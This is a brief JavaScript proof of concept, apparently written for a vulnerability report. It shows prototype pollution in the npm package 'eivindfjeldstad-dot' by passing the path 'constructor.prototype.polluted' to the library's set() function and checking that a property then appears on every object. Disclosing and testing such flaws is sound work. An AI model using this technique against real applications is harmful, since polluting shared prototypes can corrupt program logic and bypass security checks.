var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const a = require('eivindfjeldstad-dot');
console.log({}.polluted);
let path = 'constructor.prototype.polluted';
a.set(obj, path, 'yes');
console.log({}.polluted);